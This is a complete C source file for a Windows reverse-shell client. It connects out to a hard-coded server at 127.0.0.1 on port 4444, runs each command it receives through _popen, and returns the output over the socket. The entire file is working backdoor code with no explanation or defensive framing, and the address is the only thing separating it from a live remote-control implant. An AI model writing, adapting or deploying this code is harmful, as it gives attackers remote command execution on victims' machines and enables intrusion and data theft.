#include "client.h"
#include <stdio.h>
#include <string.h>

#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT "4444"

static void session(SOCKET s) {
    char cmd[1024];
    char out[8192];
    for (;;) {
        int n = recv(s, cmd, sizeof cmd - 1, 0);
        if (n <= 0) break;
        cmd[n] = '\0';
        if (!strcmp(cmd, "exit")) break;
        FILE *p = _popen(cmd, "r");
        int m = 0;
        if (p) {
            m = (int)fread(out, 1, sizeof out - 1, p);
            _pclose(p);
        }
        send(s, out, m, 0);
    }
}

int main(void) {
    if (initialize_winsock()) return 1;
    SOCKET sock = connect_to_server(SERVER_IP, SERVER_PORT);
    if (sock == INVALID_SOCKET) { WSACleanup(); return 1; }
    session(sock);
    cleanup_client(sock);
    return 0;
}
